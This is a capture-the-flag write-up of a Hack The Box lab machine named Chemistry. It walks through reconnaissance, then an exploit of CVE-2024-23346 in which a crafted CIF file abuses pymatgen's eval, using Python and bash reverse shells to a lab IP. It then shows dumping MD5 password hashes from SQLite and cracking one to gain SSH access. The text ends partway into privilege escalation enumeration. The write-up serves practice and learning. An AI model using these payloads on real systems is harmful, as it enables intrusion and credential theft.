## Scaning
### Passive
From the ping to the machine we can assume that is a Linux (TTL ~ 64):
```
┌──(oriol㉿zero)-[~]
└─$ ping -c1 10.10.11.38                
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=40.9 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.929/40.929/40.929/0.000 ms
```

From the traceroute we can see that the target machine is on another network as us (10.10.14.0/23) and we have to go to out gateway to connect to. As always on htb.
```
┌──(oriol㉿zero)-[~]
└─$ traceroute 10.10.11.38 
traceroute to 10.10.11.38 (10.10.11.38), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  39.741 ms  39.920 ms  39.877 ms
 2  10.10.11.38 (10.10.11.38)  39.865 ms  39.860 ms  40.289 ms
```

It seems that it hasn't any webpages (on the default ports):
```
┌──(oriol㉿zero)-[~]
└─$ wget http://10.10.11.38
--2024-11-12 18:40:39--  http://10.10.11.38/
Connecting to 10.10.11.38:80... failed: Connection refused.
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~]
└─$ wget https://10.10.11.38
--2024-11-12 18:40:45--  https://10.10.11.38/
Connecting to 10.10.11.38:443... failed: Connection refused.
```

It doesn't have smb:
```
┌──(oriol㉿zero)-[~]
└─$ smbclient -L 10.10.11.38                                      
do_connect: Connection to 10.10.11.38 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

It neither has mysql:
```
┌──(oriol㉿zero)-[~]
└─$ mysql -h 10.10.11.38
ERROR 2002 (HY000): Can't connect to server on '10.10.11.38' (115)
```

Nor ftp:
```
┌──(oriol㉿zero)-[~]
└─$ ftp 10.10.11.35
ftp: Can't connect to `10.10.11.35:21': Connection timed out
ftp: Can't connect to `10.10.11.35:ftp
```

Finally, a service that is running, it has ssh enabled:
```
┌──(oriol㉿zero)-[~]
└─$ ssh user@10.10.11.38     
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
user@10.10.11.38's password:
```

### Active
Let's do an nmap with scripts and version enumeration on all ports:
```
┌──(oriol㉿zero)-[~]
└─$ nmap -sC -sV -p- -Pn 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 18:59 CET
Nmap scan report for 10.10.11.38
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Tue, 12 Nov 2024 18:00:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/12%Time=673397A8%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Tue,\x2012\x20Nov\x202024\x2018:00:11\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.37 seconds
```

That's why we didn't see anything on the passive phase... It only has ssh and a web page running on the port 5000.

The web page is made with **python**, version **3.9.5** (Quite old, at the time writing this the last python version is 3.13), we also can see that is built on the **Werkzeug** library, version **3.0.3**. Judging the html content we can assume is some type of chemistry page, which has a login page (we can try to exploit that later).

We also got the openvpn version, **OpenSSH 8.2p1**, and the distribution of the machine, which is an **Ubuntu**, further confirming that is a Linux, as seen on the passive scan.

With whatweb we get the same results as the nmap:
```
┌──(oriol㉿zero)-[~]
└─$ whatweb http://10.10.11.38:5000      
http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

Looking at the web page, confirm that it has the options to login and register.
![[chemistry_01.png]]

Let's do some directory fuzzing and see if we can discover some interesting pages:
```
┌──(oriol㉿zero)-[~]
└─$ ffuf -u http://10.10.11.38:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.38:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 47ms]
# Copyright 2007 James Fisher [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 46ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 45ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 46ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 59ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 60ms]
                        [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 61ms]
#                       [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 61ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 62ms]
#                       [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 63ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 65ms]
#                       [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 68ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 70ms]
# on atleast 2 different hosts [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 69ms]
login                   [Status: 200, Size: 926, Words: 226, Lines: 29, Duration: 44ms]
register                [Status: 200, Size: 931, Words: 226, Lines: 29, Duration: 45ms]
upload                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 46ms]
logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 42ms]
dashboard               [Status: 302, Size: 235, Words: 18, Lines: 6, Duration: 42ms]
                        [Status: 200, Size: 719, Words: 137, Lines: 22, Duration: 42ms]
:: Progress: [220560/220560] :: Job [1/1] :: 423 req/sec :: Duration: [0:09:45] :: Errors: 0 ::
```

We can see that, other than the login and register pages, there is upload, logout (which is a redirect to the login page), and dashboard. I'm assuming that we will get access to those pages once we have registered.

So, let's register to the page:
I use some random credentials, and once logged in we encounter that we can upload folders.
![[Pasted image 20241113190100.png]]

So, we found that about the machine:
- It's a Ubuntu
- ssh, verison 8.2p1
- web applicattion running on port 5000
- python, version 3.9.5
- Python library Werkzeug, verison 3.0.3
- We can upload files to the server
- We can input to the login and register camps
## Gaining access
Let's see if we can find some easy to exploit vulnerability on the ssh service:
```
┌──(oriol㉿zero)-[~]
└─$ searchsploit openssh 8.2
Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~]
└─$ searchsploit python 3.9 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LibreOffice < 6.2.6 Macro - Python Code Execution (Metasploit)                                                                                                                                            | multiple/remote/47298.rb
Plone - 'in_portal.py' < 4.1.3 Session Hijacking                                                                                                                                                          | python/webapps/38738.txt
Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated)                                                                                                                                      | python/webapps/51669.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~]
└─$ searchsploit Werkzeug  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                                                                                                                                                                  | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                                                                                                                                                                | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                                                                                                     | python/remote/37814.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

No results on the openssh, also no relevant results on python, but on Werkzeug I see we can make a reverse shell if the debugging functionality is enabled, so let's download the exploit with the `-m` flag.

```
┌──(oriol㉿zero)-[~/chemistry]
└─$ searchsploit -m multiple/remote/43905.py
  Exploit: Werkzeug - 'Debug Shell' Command Execution
      URL: https://www.exploit-db.com/exploits/43905
     Path: /usr/share/exploitdb/exploits/multiple/remote/43905.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/oriol/chemistry/43905.py
```

So, let's run the exploit:
```
┌──(oriol㉿zero)-[~/chemistry]
└─$ python 43905.py 10.10.11.38 5000 10.10.14.157 4422
[-] Debug is not enabled
```

It doesn't have debug enabled... I usually don't like to run exploits without knowing and understanding what they do, so in essence it searches if the web page has any /console directory, which as we saw on the scanning phase, it doesn't have any. After looking for the /console directory (which indicates is in debug mode), it creates a reverse shell with python, it searches a secret, which is like a token for access and a 20 character alphanumeric string. Finally it sends the reverse shell.

Unlucky we didn't find anything easy on the services, so let's try on the page.

First of all let's see if we can do an injection:

I input `' OR '1'='1`, `--`, `#`, `" or ""="` with no result. As from my experience, and seeing that is a very simple page built with python, maybe it isn't using any database, and instead saving all the credentials on a file, like json. Also, as it's written on python (backend), there is no relevant information on the source:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="[/static/styles.css](view-source:http://10.10.11.38:5000/static/styles.css)">
</head>
<body>
    
      
    
    <div class="container">
        <h1 class="title">Register</h1>
        <form method="post">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" name="username" id="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" name="password" id="password" required>
            </div>
            <center><button type="submit" class="btn-submit">Register</button></center>
        </form>
        <p>Already have an account? <a href="[/login](view-source:http://10.10.11.38:5000/login)">Login here</a></p>
    </div>
</body>
</html>
```

Let's leave that on standby before looking it deeper and focus on the file uploading.

I try to upload a test.txt
![[chemistry_03.png]]

It redirects me to the http://10.10.11.38:5000/upload url and with the error code 405 Method not allowed:
![[chemistry_04.png]]

So i'm guessing it only accepts valid .cif files, like the example that they give to us:
```
┌──(oriol㉿zero)-[~/chemistry]
└─$ cat example.cif 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
 ```

So given this fact, we can assume that the server is using the magic numbers of the file or that the python parses the file and detects if it is a cif model or not.

So let's try the first case, that the server is using the magic numbers to determine the file type, I've created a python reverse shell:
```
┌──(oriol㉿zero)-[~/chemistry]
└─$ cat cif_test.cif      
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Now, let's change the file magic numbers, but first I get the numbers from the real .cif file:
In this command I'm using xxd to see the hexadecimal format of the file, and only show the first 8 bytes, as are commonly used for the magic numbers:
```
┌──(oriol㉿zero)-[~/chemistry]
└─$ xxd -l 8 -p example.cif 
646174615f457861
```

Then, I edit the magic numbers of the reverse shell:
```
hexedit cif_test.cif
```

```
00000000   64 61 74 61  5F 45 78 61  63 20 27 6
```

```
┌──(oriol㉿zero)-[~/chemistry]
└─$ xxd -l 8 -p cif_test.cif                               
646174615f457861
```

Let's try:


No success, now let's try with the cif format.

A quick google search, results in a cve: **CVE-2024-23346**
Seems that the library (Pymatgen) that is used for parsing the file and determining if is a CIF or not, has a method that uses the infamous **eval()** funcition.

It even has a POC following the CIF file model, this are the lines that are used for the exploit:
```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
```

The thing is, that the "touch pwned" command is the one that is going to be executed on the server. We should change that to create a reverse shell. The safest thing is to create a bash reverse shell, as is the most used shell. 

To create a reverse shell, I'll use this command:
```
/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.157/4444 0>&1\'
```

And as always netcat listening on the same port configured on the reverse shell command:
```
nc -nvlp 4444
```

I add the exploit lines to the cif example and upload it to the page. When clicking "view", the pages freezes, but after looking at the netcat I can see that a reverse shell was created:
```
┌──(oriol㉿zero)-[~]
└─$ sudo nc -nvlp 4444
[sudo] password for oriol: 
listening on [any] 4444 ...
connect to [10.10.14.157] from (UNKNOWN) [10.10.11.38] 41950
sh: 0: can't access tty; job control turned off
$ whoami
app
```

Great! We are the user app. Let's collect the flag.
```
$ ls
app.py
instance
static
templates
uploads
```

Seems that the flag isn't here, so before searching further, let's create a better shell for convenience. I will do it with python, as I know this server has it installed:
```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
app@chemistry:~$ 
```

Let's do a find:
```
app@chemistry:~$ find / -iname user\.txt 2>/dev/null
find / -iname user\.txt 2>/dev/null
/home/rosa/user.txt
```

Seems we'll have to get access to the rosa user...
This is still part of ganing access, as the I am assuming that the rosa user doesn't have any admin privileges.

Doing a cat on the app.py file, we can see this:
```
hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
```

Seems that there is some type of database on the server, and on the top of the file we can see the credentials:
```
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
```

The database name is database, and we know the password, let's try to get some information about the users, maybe rosa logged in with the same password?
As this is a sqlite, the database should be a file, so, let's do a quick find on the directory we are in.
```
app@chemistry:~$ find . -iname *\.db 2>/dev/null
find . -iname *\.db 2>/dev/null
./instance/database.db
```


Let's connect:
```
app@chemistry:~/instance$ sqlite3 database.db   
sqlite3 database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
```
Great, now we can see the database, let's see which tables exists:
```
sqlite> .tables
.tables
structure  user
```

We do a full select of all the user table, and we get the username and hash of the password.
```
sqlite> select * from user;
select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|tester|ae2b1fca515949e5d54fb22b8ed95575
16|fdhjgfjhd|098f6bcd4621d373cade4e832627b4f6
17|test123|cc03e747a6afbbcbf8be7668acfebee5
18|guest|084e0343a0486ff05530df6c705c8bb4
19|1|c4ca4238a0b923820dcc509a6f75849b
20|user1|24c9e15e52afc47c225b757e7bee1f9d
```

The user rosa exists, and also looking at the app.py file, we can see that the hash is a md5
```
hashed_password = hashlib.md5(password.encode()).hexdigest()
```

As this is a simple md5, I think that maybe we can crack it via web, as it is faster than doing brute force, as the web uses a rainbow table and we can get the result in seconds.

![[chemistry_06.png]]
**rosa:unicorniorosado**
We got the credentials!
Right now, we have 2 options, change users with `su rosa` or try to ssh with the rosa user. I will first try the second one, as I will get a interactive shell.
```
┌──(oriol㉿zero)-[~]
└─$ ssh rosa@10.10.11.38
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
```

We collect the user.txt flag.

## Privilege escalation
Rosa doesn't have any permissions to run sudo
```
rosa@chemistry:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

I don't see any interesting files with UID permission, all the ones I see are the ones that are by default and can't be exploited:
```
rosa@chemistry:~$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
```

Can't see any crontab editable, and the user rosa does not have anything on the crontab that can help us
```
rosa@chemistry:~$ ls /var/spool/cron/crontabs/
ls: cannot open directory '/var/spool/cron/crontabs/': Permission denied
```

I do a `top` to see which processes are running on the server:
```
top - 16:21:08 up 3 min,  2 users,  load average: 0.09, 0.27, 0.13
Tasks: 262 total,   1 running, 261 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.2 sy,  0.0 ni, 99.7 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1939.8 total,    945.7 free,    343.6 used,    650.6 buff/cache
MiB Swap:   2560.0 total,   2560.0 free,      0.0 used.   1426.9 avail Mem 

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                                                                                                                                              
   1713 rosa      20   0    9408   3980   3172 R   0.3   0.2   0:00.02 top                                                                                                                                                                  
      1 root      20   0  168104  11540   8480 S   0.0   0.6   0:01.58 systemd                                                                                                                                                              
      2 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kthreadd                                                                                                                                                             
      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp                                                                                                                                                               
      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_par_gp                                                                                                                                                           
      5 root      20   0       0      0      0 I   0.0   0.0   0:00.10 kworker/0:0-mm_percpu_wq                                                                                                                                             
      6 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/0:0H-kblockd                                                                                                                                                 
      7 root      20   0       0      0      0 I   0.0   0.0   0:00.00 kworker/u256:0-events_unbound                                                                                                                                        
      8 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 mm_percpu_wq                                                                                                                                                         
      9 root      20   0       0      0      0 S   0.0   0.0   0:00.06 ksoftirqd/0                                                                                                                                                          
     10 root      20   0       0      0      0 I   0.0   0.0   0:00.06 rcu_sched                                                                                                                                                            
     11 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 migration/0                                                                                                                                                          
     12 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/0                                                                                                                                                        
     13 root      20   0       0      0      0 I   0.0   0.0   0:00.06 kworker/0:1-events                                                                                                                                                   
     14 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/0                                                                                                                                                              
     15 root      20   0       0      0      0 S   0.0   0.0   0:00.00 cpuhp/1                                                                                                                                                              
     16 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 idle_inject/1                                                                                                                                                        
     17 root      rt   0       0      0      0 S   0.0   0.0   0:00.07 migration/1                                                                                                                                                          
     18 root      20   0       0      0      0 S   0.0   0.0   0:00.03 ksoftirqd/1                                                                                                                                                          
     19 root      20   0       0      0      0 I   0.0   0.0   0:00.03 kworker/1:0-events                                                                                                                                                   
     20 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kworker/1:0H-kblockd                                                                                                                                                 
     21 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kdevtmpfs                                                                                                                                                            
     22 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 netns                                                                                                                                                                
     23 root      20   0       0      0      0 S   0.0   0.0   0:00.00 rcu_tasks_kthre                                                                                                                                                      
     24 root      20   0       0      0      0 S   0.0   0.0   0:00.03 kauditd                                                                                                                                                              
     25 root      20   0       0      0      0 I   0.0   0.0   0:00.03 kworker/0:2-cgroup_destroy                                                                                                                                           
     26 root      20   0       0      0      0 S   0.0   0.0   0:00.00 khungtaskd                                                                                                                                                           
     27 root      20   0       0      0      0 S   0.0   0.0   0:00.00 oom_reaper                                                                                                                                                           
     28 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 writeback                                                                                                                                                            
     29 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kcompactd0                                                                                                                                                           
     30 root      25   5       0      0      0 S   0.0   0.0   0:00.00 ksmd                                                                                                                                                                 
     31 root      39  19       0      0      0 S   0.0   0.0   0:00.00 khugepaged                                                                                                                                                           
     36 root      20   0       0      0      0 I   0.0   0.0   0:00.03 kworker/1:1-memcg_kmem_cache                                                                                                                                         
     78 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kintegrityd                                                                                                                                                          
     79 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kblockd                                                                                                                                                              
     80 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 blkcg_punt_bio                                                                                                                                                       
     81 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 tpm_dev_wq                                                                                                                                                           
     82 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 ata_sff                                                                                                                                                              
     83 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 md                                                                                                                                                                   
     84 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 edac-poller                                                                                                                                                          
     85 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 devfreq_wq                                                                                                                                                           
     86 root      rt   0       0      0      0 S   0.0   0.0   0:00.00 watchdogd                                                                                                                                                            
     87 root      20   0       0      0      0 I   0.0   0.0   0:00.00 kworker/u256:1-events_unbound                                                                                                                                        
     89 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kswapd0                                                                                                                                                              
     90 root      20   0       0      0      0 S   0.0   0.0   0:00.00 ecryptfs-kthrea                                                                                                                                                      
     92 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 kthrotld                                                                                                                                                             
     93 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/24-pciehp                                                                                                                                                        
     94 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/25-pciehp                                                                                                                                                        
     95 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/26-pciehp                                                                                                                                                        
     96 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/27-pciehp                                                                                                                                                        
     97 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/28-pciehp                                                                                                                                                        
     98 root     -51   0       0      0      0 S   0.0   0.0   0:00.00 irq/29-pciehp
```

It doesn't seem to be an interesting process running...

Let's check the connections:
```
rosa@chemistry:~$ netstat -l
Active Internet connections (only servers)
